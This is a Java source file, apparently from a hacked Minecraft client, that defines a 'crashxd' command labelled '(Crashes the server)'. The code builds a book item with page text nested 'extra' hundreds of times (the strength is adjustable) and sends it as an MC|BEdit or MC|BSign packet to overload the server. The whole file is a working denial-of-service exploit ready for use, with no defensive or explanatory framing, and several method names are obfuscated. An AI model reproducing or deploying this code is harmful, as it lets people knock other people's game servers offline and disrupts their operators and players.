package client.util;

import io.netty.buffer.Unpooled;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import org.apache.commons.lang3.RandomStringUtils;

public class BaseStringEntryAdapter extends AuxiliaryStringEntry {
   @Override
   public void updateState() {
      String text = "§c" + this.getString() + "§7 (Crashes the server)";
      this.applyText(text);
   }

   @Override
   public void printStackTrace(String[] textArray, String text) {
      int count = 850;
      if (textArray.length > 1) {
         try {
            count = Integer.parseInt(textArray[1]);
         } catch (Exception exception) {
            String text2 = "§7" + this.getString() + " [§2Strength (default 850)§7]";
            this.applyText(text2);
            return;
         }
      }

      StringBuilder builder = new StringBuilder();
      builder.append("{");

      for (int index = 0; index < count; index++) {
         builder.append("extra:[{");
      }

      for (int index2 = 0; index2 < count; index2++) {
         builder.append("text:a}],");
      }

      builder.append("text:a}");
      ItemStack stack = new ItemStack(Items.writableBook);
      NBTTagCompound tagCompound = new NBTTagCompound();
      NBTTagList nBTTagList = new NBTTagList();

      for (int index3 = 0; index3 < 2; index3++) {
         nBTTagList.applyLISTManager(new HandlerStringEntry(builder.toString()));
      }

      tagCompound.put("author", RandomStringUtils.random(20));
      tagCompound.put("title", RandomStringUtils.random(20));
      tagCompound.put("resolved", (byte)1);
      tagCompound.applyText("pages", nBTTagList);
      stack.processAction(tagCompound);
      PacketBuffer packet = new PacketBuffer(Unpooled.buffer());
      packet.applyItemStack(stack);
      String text3 = Math.random() > 0.5 ? "MC|BEdit" : "MC|BSign";
      MinecraftAccessor.minecraft.getNetHandlerPlayClient().handlePacket(new C17PacketCustomPayload(text3, packet));
      String text4 = "XDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD";
      this.applyText(text4);
   }

   public BaseStringEntryAdapter() {
      super("crashxd");
   }
}
